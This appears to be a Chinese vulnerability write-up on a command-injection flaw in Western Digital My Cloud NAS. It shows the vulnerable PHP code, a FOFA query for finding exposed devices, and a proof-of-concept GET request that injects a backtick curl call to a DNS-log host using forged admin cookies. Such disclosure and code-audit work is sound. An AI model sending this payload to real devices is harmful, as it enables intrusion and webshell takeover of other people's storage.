---
title: "Western Digital My Cloud NAS chk_vv_sharename.php 命令执行漏洞"
source: https://mrxn.net/jswz/Western-Digital-My-Cloud-NAS-chk_vv_sharename-rce.html
asset_dir: assets/western-digital-my-cloud-nas-chk_vv_sharename.php-命令执行漏洞
---

# Western Digital My Cloud NAS chk\_vv\_sharename.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/4 08:27
- 756浏览
- [0评论](#comment)
- 9分钟阅读

深入探索

Western Digital My Cloud NAS

滙豐卡$2000減$150 WD 3.5吋 4TB My Cloud Home 網絡儲存裝置 wdbvxc0040hwt 香港行貨

西部数据

---

# 漏洞简介

Western Digital My Cloud NAS是美国西部数据（Western Digital）公司的一款应用广泛的网络连接云存储设备，可用于托管文件，并自动备份和同步该文件与各种云和基于Web的服务。Western Digital My Cloud NAS `chk_vv_sharename.php` 接口文件未对用户传入参数进行校验，导致[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过构造恶意请求写入webshell，获取服务器权限。

硬盘驱动器

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> `icon_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"`

# 漏洞分析

直接看 `php\chk_vv_sharename.php` 其业务实现逻辑如下

```
$vv_sharename = $_GET['vv_sharename'];
if(empty($_GET["vv_sharename"])) 
{
        echo 'Parameter vv_sharename is missing.';
        return;
}
$cmd = "vvctl --check_share_name -s \"$vv_sharename\" >/dev/null";
system($cmd);
```

代码中通过 `$_GET['vv_sharename']` 直接获取用户输入参数，未经过任何过滤或转义便拼接至系统命令 `vvctl --check_share_name -s` 中，攻击者可通过构造恶意参数[注入任意系统命令](https://mrxn.net/tag/rce)。

# 漏洞复现

```
GET /web/php/chk_vv_sharename.php?vv_sharename=`curl+xx.dnslog.pt` HTTP/1.1
Host: western.digital.nas.mrxn.net
Cookie: username=admin; isAdmin=1
```

在DNSLOG平台成功收到请求

漏洞预警服务

[![Western Digital My Cloud NAS chk_vv_sharename.php 命令执行漏洞](images/img-001-2098bf46cb0a.webp)](https://image.mrxn.net/a299a58b27364f45af33b58cffcc03af.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALiUlEQVR4AeydAXLjuA5E/fb+d94/cOcpIkRaTiY/dtUqNUirGw2QIaQk9s7U/nO73f79TvzbPr7To2psU9cVcrG0is5LW0X3PsvPfK6nT+y6/DtYA/lTd/15lxPYBvJn2rdnom8cuAFbrflVr56HeT2MOoT3evkeYfRCuHvSK4fkIWgewvV1HZJX72jdGe7rtoHsxev6dSdwGAhk6jDis1v0btAP6SM3D9Hl5mGum+9++QytESG9O5/V7jX9ojn5GULWhRFndYeBzEyX9nsn8OMDgdwFZ1+CdxnED8Fn9Uf9Ib302FPsOsQPQfMwcvWOvW/Pf4X/+EC+svjlPZ7Ajw+k3y2dw3jX9fxxi3MF0geOaIW9IR51GLk+Eca8deZXXP1v8McH8jebuWpvt8NAvAs6nh0WcH89cvf9+QThMOKf1P0PRL+Tyaez9Xt+zyftHkow7mXfq64thvggqH6G1WMWs7rDQGamS/u9E9gGApk6PMbV1rwDIPVy/SsOox/CrYORq4uQPKD01whMn/b+NbgQjP6uQ/IwR/2F20CKXPH6E/jHqX8V3bp1nUPuBvMQrq8jJK/fvBySVxfNF6qtEOY9ur96VUD8dV0B4d3feXm/G9cT0k/zxfwwEJjfBRAd5ujXAcl7h6h3ri72PKTPWR7ig0+0BqLJ+xpnunl43Me+MPogHB6j6xQeBlLiFa87gW0gkCk67b4lddG8HOb1EP27futg7KP+CN2b2L2QnjBi953Vd3/nvV4uwuf620B6k4u/5gT+gUzH5eFr3LoV9rug+yDrQbDnd/zLl5CeMKJ7Es8aQ+r1QfhZvXmI3/pHeD0hj07nBbnl6xDIVJ2ye+u865A6GNE6iC63/gyf8esRz3qa736Y71GfCPGt+qivEMb68l1PSJ3CG8U2EMi0INj3CNEh6F3SferiKv+sDlkPgr2vvBDigWBpFX2tFS9vxSoP6bvKn+nVu+KRbxvII9OV+70TWA6kJlkB411RWsVqixA/BMtboR+iyytXIRdLmwWM9RAOWLr9HTFgeNfWfpvx4wLig6A+GPmHfQN9ChC/XNQHY15dX+FyIJW84vdP4PA6xC1ApukURYgOwe6Xn/n1rRCe6+86e4TU7rW6di1IXn6GMPfDXO/9IL7aQwWEd1/x6wmpU3ijOAykJljhHmGcZuX2oe9ZtBbSF4K9Xp965zCv018Ic8/Qq4wtIHUrH4x5CG9tlnTVtwoOAynxitedwPZKvW/BKYrmYbwbYOQrn30gfnn3q0N8MKL+7yA818s9rNYwD+nXffCcDkff9YT003wx3waymjpkihDU1/etvsLuh/R7Vrev/s5Lh/TsOYhenoqe7xzih+Aqry5W7wo5pL60iq7LK2dsA1G48LUnsBwIZLp9ihDdbfe8OsQHQfWO1ovmO1cX4djXGkhO3hGSt9cKrVvlIX0g2H3WizD37euWA9mbruvfO4FtIJDpOU23ANHl5iE6BM137H7z6vKOkL7dJxchPqC32DgwfU8LokPQnlvhxwUk/0GX0OshdRC0sPvUC7eBFLni9SewvZfVp7bikGn3fP9SzMNz/lV91yH9ur7nfe19rq4hPfSJEL08FTByfSuE+IH7E6mvelV0XlqFeuH1hNSJvFFsr9Qh03VvMHL1mmKFXIT4IaguQvSqrYBwGFH/dxDGXrXOPlY9IXXm9zX7a/MijHXq1nQOcz9EB47/YOd2fbz0BLZvWU4VMq2+K4gOI3affZ7V9VknqkPWk4sw180/QteA9JA/qqkcxF/XFdbBqEM4jLjyVy9jG4jCha89ge23rL4Np6ku72i+I+Tu0G8eostFiA4j9nr96jPUA+m14uqiveQipI95CDcvmu9oHlJnXl1eeD0hnsqb4DYQGKcH4X2fMNdruhXdL4fUlWcf5vfa/tr8CiF9gZXl/poAvp+3MXDv5f4g3LwIc906fTPcBjJLXtrvn8A1kN8/84crPhzIrHL12EEeUwj22l4H8XXdOkgeRjQvWl+otsLyVEB66iutAkYdRl6eil4nF8tTIRch/SA40788EJtc+P85ge2tk5pohcvUdYUcMlUY0bxYNfuA+M13hHl+36OuV3WQevjE7pVDPHIRotc6Fep1XSGH+M44xAdB/WL1rJDv8XpC9qfxBteHF4aQqUKw77EmW7HSYV4Ho1499tH7ySF1etW/gtau0F6QtWBE8x3t1/XO9YnmIevIC68npE7hjWL7GdL35DRF83CcqrnC7i+tYqVXrgLSF0asXAVE733keyx/hRqkFkYszz70q3WuDmOf7pOLvU4+w+sJmZ3KC7XDzxCnCuNd4B7Ndw6P/TDP26fj2TrdXxyyhrUw8vI8Chj9MHJr7S/C6INwCFonwlyv/PWE1Cm8URx+hsB6erVvGPMQ7t0ilrcCkq/rRD5DdAj2uri+9xnS02oYuWvBXLdOn/y7COM69pn1v54QT+dNcBsIzKfoPp3mCvXB2OfMv6pTt37FIesBWrZ/9LkJHxerXl0H7m+zf5RtcOaDsa77baQOo7/y20CKXPH6E1gOxCmKbhUyVRjR/LN+faL1ZwhZV5/1ezS3Qhh76IO5bl6E0efa5s949+kvXA7Eogt/9wQOr0P68jC/G2qaFWd+8+WtkK+wPBXmIetDsHL7gOiAJffv/3D8n8xosF4O3GvkqzzEt8pbL0L88mfwekKeOaVf9GwDceoijNOFcAj2PcKoQ7j9ur9zfZC6VX6lV33PwbwXjHrVVvR6eeX2AfN6PZC83D4rhPiB66+S3t7sY3tC4HNKwLZNp9wRuH/fVbdALkJ85kWY66s8xA8j6i+E5Oq6wj3UdQWMeQiHYHlmAclD8KyvPSB+CKqLEN1+hdtANF342hNYDqSmVQGZotuEkauXt0IullYBY11pFTDq1onl2UfX5YV7X13Dc72rtqJqKmBeV7kKGPOlVVSPfZQ2C0i9uX3NciB703X9eydwGEifmhzmU4XobhnCIahuH7HrneuDeR/9kDwcUY9oTxFSI+8+uQhzv3nRfhC/Osw5RAeu37Jub/Zx+O8hZ/uDTNO7oPtXuj5Ifecw1/V1hNHf83vunmCsUdcLY169+9Q7QuohuKpTF/d9Dt+y9snr+vdP4DAQyHQh6JacpghjHsIhaJ0Iow7h9lv5Vnn1PdpDTQ7jWhAOQX29Th3iW+X19TykDoL6RIhuXeFhIJovfM0JLN/trWlV9G3BONWer5qKZ3V43M8+EF/nEB0wdX8HAT557adiM3xclFYB3Gs+5Ps1lJZQF2HUIRyC+s6w1q6A1AHXb1m3N/vYfsuqSe1jtU89Pb/S4XP6QC/bOHC/MxXsB6Pe8/r22D1ySC+9EG5eNC/vuMqrd+z1j/j1M+TR6bwgt/0Mgdwt8Bz2vcJY1/P9rpHrk4uQfuZXCPEBK8v9yYPPPHDXLHBNOYx5dRGS73U9L+8Iqe968esJqVN4o9gG4rTP8Gzvq3rrYH13lAeSP+tT3oq9r/g+YN5Lj7UQHwR7Xg5jXr2jfbsuf5TfBqL5wteewGEgkLsARlxtczVtGOshvPexHuZ5iA5B6yEcjqhHhNHTdbnonuSiugjpax7CYUTz1slF9cLDQDRd+JoT+LGB1HQrIHdH/3IqV6EOo69yFebF0io6L61CfY+lV6jV9SxWeXXIHq2FcPPqZ1wfpF7/DH9sILPml/b1E/jrgUCmDkG34F0hqq8QxnoYee8DY37fF5LrNXogebkIX9OtE+G5ehh9EA5c72Xd3uzj8IR4V3Vc7VufeTl8Th0wvf3bje6Ti1vB4kLfI+ylwPQVOox6r3MNdYgfgj0vhzGvLtpPXngYiKYLX3MC20Ag04TH+Ow2a9oVZ/7yVHRfaRUw7kcfjDpgakNg+kRshsUFpK7Wr4CRl7aPRZvtu4F5SB+5CNGB62fI7c0+tifkzfb1n93O/wAAAP//wbG/qQAAAAZJREFUAwBefVaVrR115QAAAABJRU5ErkJggg==)

手机扫码阅读
